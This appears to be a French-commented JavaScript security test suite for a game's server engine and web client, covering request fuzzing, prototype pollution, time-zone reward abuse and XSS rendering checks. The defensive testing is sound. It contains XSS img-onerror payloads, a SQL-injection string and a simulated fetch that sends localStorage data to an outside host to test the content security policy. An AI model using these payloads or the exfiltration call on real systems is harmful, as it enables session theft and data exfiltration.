// Sécurité : fuzzing du noyau serveur (entrées hostiles), fuseau horaire, XSS dans le client, requêtes malformées
const {pfApply,pfMakeEngine}=require('./pf_core.js');const src=require('./pf_src.js')();
let ok=0,ko=0;const T=(n,c,x)=>{if(c)ok++;else{ko++;console.log('KO',n,x===undefined?'':JSON.stringify(x).slice(0,400));}};
const T0=Date.UTC(2026,10,18,12),H=36e5;
const ACTIONS=['hello','sync','reset','pass_claim','pass_buy','pass_all','shop_gift','week_offer','medal','build','rush','adbuild','slot','jslot','wp','wpreset','joker','equip','pack','gift_offer','ad','claim','login','prestige','titan_gem','titan_start','titan_end','purchase','gemitem','skin','rename','league','offline_x2','report','restore','gquest','road','boss_ext','guild_pay','guild_reward','__proto__','constructor','toString'];
const NASTY=[null,undefined,true,-1,0,1,1.5,-1e308,1e308,NaN,Infinity,-Infinity,'','__proto__','constructor','prototype','toString','hasOwnProperty','<img src=x onerror=alert(1)>',"' or 1=1 --",'a'.repeat(5000),[],[1,2],{},{__proto__:{polluted:1}},{toString:1},'9e999','-5','st_cad','g100','starter','pass','ev1','boost','gift','shop','titan','offline','p','f','g','s'];
let seed=1;const rnd=()=>{seed=(seed*16807)%2147483647;return seed/2147483647;};const pick=a=>a[Math.floor(rnd()*a.length)];
function junkObj(depth=0){const o={};const n=Math.floor(rnd()*5);for(let i=0;i<n;i++){const k=pick(['id','i','n','k','kind','track','cur','score','name','tier','gems','minutes','target','p','__proto__','constructor']);o[k]=depth<2&&rnd()<0.2?junkObj(depth+1):pick(NASTY);}return o;}
function junkSim(){const r={};for(const k of ['stage','sparks','brate','srate','krate','cells','tb','fled'])if(rnd()<0.6)r[k]=k==='cells'?pick([[],Array(49).fill(60),Array(500).fill(1),['x'],[NaN]]):k==='tb'?junkObj():pick(NASTY);
  return pick([null,'x',[],{run:r,st:junkObj(),day:junkObj(),week:junkObj(),bestiary:pick([{},{'__proto__':5},{'1':1e308,'2':'x'}]),settings:junkObj(),i:pick(NASTY),b:pick(NASTY)}]);}
function scan(o,path,bad,seen=new Set()){if(o&&typeof o==='object'){if(seen.has(o))return;seen.add(o);for(const k of Object.keys(o))scan(o[k],path+'.'+k,bad,seen);}else if(typeof o==='number'&&!isFinite(o))bad.push(path+'='+o);}
function base(t,o){const g=pfMakeEngine(src,t);const S=g.fresh();S.tz=60;S.lastSeen=t-60e3;S.gems=500;S.run.sparks=1e6;S.run.stage=S.run.max=45;S.bestStage=45;Object.assign(S,o||{});return S;}
// A. fuzzing : 6 000 requêtes hostiles
let crashes=0,nan=0,neg=0,poll=0,examples=[];let S=base(T0);let t=T0;
for(let i=0;i<6000;i++){t+=Math.floor(rnd()*20000);const body={action:pick(ACTIONS),payload:rnd()<0.1?pick(NASTY):junkObj(),sim:rnd()<0.5?junkSim():undefined,tz:pick([60,-720,840,9999,'x',1.5,undefined]),lang:pick(['fr','xx',5,undefined,'__proto__']),demo:rnd()<0.05?pick([true,'true',1]):undefined};
  let r;try{r=pfApply(src,JSON.parse(JSON.stringify(S)),body,t,false);}catch(e){crashes++;if(examples.length<3)examples.push(body.action+': '+e.message);continue;}
  const bad=[];scan(r.state,'S',bad);if(bad.length){nan++;if(examples.length<6)examples.push(body.action+' '+bad.slice(0,3).join(' '));}
  if(r.state.gems<0||r.state.run.sparks<0||!(r.state.run.stage>=1)||!Number.isInteger(r.state.run.stage)){neg++;if(examples.length<8)examples.push('neg '+body.action+' '+r.state.gems+' '+r.state.run.sparks+' '+r.state.run.stage);}
  if(({}).polluted!==undefined||Object.prototype.polluted!==undefined)poll++;
  if(rnd()<0.97)S=r.state;else S=base(t);}
T('fuzzing : aucun plantage du serveur (6 000 requêtes hostiles)',crashes===0,examples);
T('fuzzing : jamais de NaN ni d\'infini dans la partie enregistrée',nan===0,examples);
T('fuzzing : gemmes et étincelles jamais négatives, étape entière ≥ 1',neg===0,examples);
T('fuzzing : pas de pollution de prototype',poll===0);
// B. actions réservées et achats
{const S1=base(T0,{gems:0});for(const a of ['guild_pay','guild_reward','league']){const r=pfApply(src,S1,{action:a,payload:{gems:999,tier:9,minutes:999}},T0,false);T(`« ${a} » refusé sans le serveur`,!r.result.ok&&r.state.gems===0);}
 const r=pfApply(src,S1,{action:'purchase',payload:{id:'g16000'}},T0,false);T('achat sans validation de la boutique : refusé',!r.result.ok&&r.state.gems===0);
 const r2=pfApply(src,S1,{action:'purchase',payload:{id:'g16000'},demo:'true'},T0,false);T('mode démo : seulement le booléen true (pas "true")',!r2.result.ok);}
// C. fuseau horaire : impossible de toucher deux fois la récompense du jour en changeant de fuseau
{let S1=base(T0,{tz:60,tzAt:T0-H});let r=pfApply(src,S1,{action:'login',tz:60},T0,false);const g1=r.state.gems;T('connexion du jour récupérée',r.result.ok);
 r=pfApply(src,r.state,{action:'login',tz:840},T0+60e3,false);const r3=pfApply(src,r.state,{action:'login',tz:-720},T0+120e3,false);
 T('changer de fuseau horaire ne redonne pas la récompense du jour',!r.result.ok&&!r3.result.ok&&r3.state.gems===g1,{a:r.result,b:r3.result,g:r3.state.gems-g1});
 let s2=base(T0,{tz:60,tzAt:T0-H});s2.day.ads=0;let n=0;for(const tz of [60,840,-720,300,-300]){const q=pfApply(src,s2,{action:'shop_gift',tz},T0+n*1000,false);s2=q.state;if(q.result.ok)n++;}T('cadeau de la boutique : une fois par jour malgré les changements de fuseau',n===1,n);
 const s3=pfApply(src,base(T0,{tz:60,tzAt:T0-8*24*H}),{action:'sync',tz:120},T0,false).state;T('changement de fuseau accepté après 7 jours (heure d\'été, voyage)',s3.tz===120&&s3.tzAt===T0);
 const s4=pfApply(src,s3,{action:'sync',tz:840},T0+H,false).state;T('…puis bloqué 7 jours',s4.tz===120);}
console.log(`t7sec (serveur) : ${ok} OK, ${ko} KO`);
// D. XSS : le client affiche des noms venus d'autres joueurs (classement, guildes, ligue)
(async()=>{const {chromium}=require('playwright');const http=require('http');const fs=require('fs');
 const html=fs.readFileSync('/home/claude/fusion/wrapped.html');const srv=http.createServer((q,s)=>{s.writeHead(200,{'content-type':'text/html'});s.end(html);}).listen(8777);
 const X='<img src=x onerror="window.__xss=(window.__xss||0)+1">';const DB={};const now=()=>T0+5e3;
 const b=await chromium.launch();const c=await b.newContext({viewport:{width:390,height:844},locale:'fr-FR'});
 await c.route(/^https:\/\/[a-z0-9-]+\.supabase\.co\//,async route=>{const q=route.request();let a={};try{a=q.postDataJSON()||{};}catch(e){}let body=null;const u=q.url();
  if(u.includes('pf_time'))body={now:now()};
  else if(u.includes('pf-act')){let p=DB[a.id];if(!p){p=DB[a.id]={state:null};const r0=pfApply(src,null,{action:'sync'},now());p.state=r0.state;Object.assign(p.state,{bestStage:60,maxStage:60});p.state.st.tuto=3;p.state.srvAt=now();p.state.simBy='x';}
   const r=pfApply(src,p.state,a,now(),false);p.state=r.state;body={ok:true,now:now(),state:r.state,result:r.result,anomalies:r.anomalies,league:a.action==='hello'?{week:'w',rank:1,size:12,gems:40,name:X}:null,effects:[{name:X},{guild:X}],hello:{name:X,flags:0}};}
  else if(u.includes('pf_board'))body={week:'w',joined:true,rows:Array.from({length:6},(_,i)=>({id:'00000000-0000-4000-8000-00000000000'+i,name:X+i,score:1000-i,best:50,me:i===2,t:''}))};
  else if(u.includes('pf_guild_list'))body={rows:[{id:'g1',name:X,code:X,n:3,pts:10}]};
  else if(u.includes('pf_guild'))body={guild:{id:'g1',name:X,code:X,leader:'x',open:true,lang:'fr'},week:'w',total:50,members:[{id:'m1',name:X,pts:5,leader:true,me:false},{id:'m2',name:X,pts:1}],claims:[],tiers:[10,50,100],now:now()};
  else if(u.includes('pf_account'))body={login:true,email:X,linked:true,mine:true};
  else body={};
  await route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(body)});});
 const p=await c.newPage();const errs=[];p.on('pageerror',e=>errs.push(e.message));p.on('dialog',d=>{errs.push('dialog '+d.message());d.dismiss();});
 await p.goto('http://localhost:8777/');await p.waitForTimeout(2500);
 for(const k of ['home','clan','profile','quests','shop']){await p.evaluate(k=>{document.getElementById('veil').hidden=true;window.__G.setTab(k);},k);await p.waitForTimeout(700);
  await p.evaluate(()=>{for(const b of document.querySelectorAll('#panel [data-clan],#panel [data-cpane],#panel button[data-gtab]'))try{b.click();}catch(e){}});await p.waitForTimeout(600);}
 await p.evaluate(()=>{window.__G.mailOpen&&window.__G.mailOpen();});await p.waitForTimeout(400);
 await p.evaluate(()=>{for(const b of document.querySelectorAll('#modal [data-mail]'))b.click();});await p.waitForTimeout(500);
 const r=await p.evaluate(()=>({xss:window.__xss||0,img:document.querySelectorAll('img[src="x"]').length,txt:document.body.innerText.includes('<img src=x')}));
 T('XSS : noms hostiles (classement, guilde, ligue, compte) affichés comme du texte, jamais exécutés',r.xss===0&&r.img===0,r);
 T('XSS : aucune erreur ni fenêtre d\'alerte',errs.length===0,errs);
 const ex=await p.evaluate(async()=>{try{await fetch('https://example.org/vol?d='+encodeURIComponent(localStorage.getItem('prisme-dev')||''));return 'parti';}catch(e){return 'bloqué';}});
 T('CSP : impossible d\'envoyer des données vers un autre site que le serveur du jeu',ex==='bloqué',ex);
 console.log(`t7sec : ${ok} OK, ${ko} KO`);await b.close();srv.close();process.exit(ko?1:0);
})().catch(e=>{console.log('ERR',e);process.exit(1);});
